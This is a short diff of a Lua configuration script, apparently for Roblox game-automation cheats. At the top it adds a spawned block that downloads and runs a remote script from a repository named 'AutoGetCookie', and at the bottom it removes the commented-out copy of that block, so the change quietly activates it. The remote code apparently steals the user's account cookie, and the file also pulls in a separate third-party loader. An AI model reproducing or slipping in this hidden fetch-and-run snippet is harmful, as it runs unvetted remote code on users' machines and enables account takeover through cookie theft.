@@ -1,3 +1,6 @@
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
+end)
 getgenv().ConfigsKaitun = {
 	["Block Pet Gift"] = true,
 
@@ -192,6 +195,4 @@ License = "qTtCbAWlIJxw3Lp2g9gMvZomk9BuHAju"
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Real-Aya/Loader/main/Init.lua'))()
 
 -- wait(60)
--- spawn(function()
--- loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
--- end)
+
